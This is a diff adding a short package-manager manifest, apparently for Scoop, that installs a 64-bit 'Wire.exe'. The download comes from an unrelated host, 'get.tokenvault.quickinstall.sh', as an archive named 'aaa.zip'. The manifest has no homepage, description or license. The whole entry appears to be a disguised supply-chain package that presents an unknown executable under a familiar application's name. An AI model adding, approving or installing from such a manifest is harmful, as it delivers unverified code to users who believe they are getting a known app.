@@ -1,0 +1,12 @@
+
+{
+    "version": "1.0.0",
+    "architecture": {
+        "64bit": {
+            "url": "https://get.tokenvault.quickinstall.sh/secure_path/aaa.zip",
+            "hash": "4DCB5BE1FDB40680D7208266B6FE1A93AF537B8B3E03364B42E0BF252CCE5F1F"
+        }
+    },
+    "bin": "Wire.exe"
+}
+
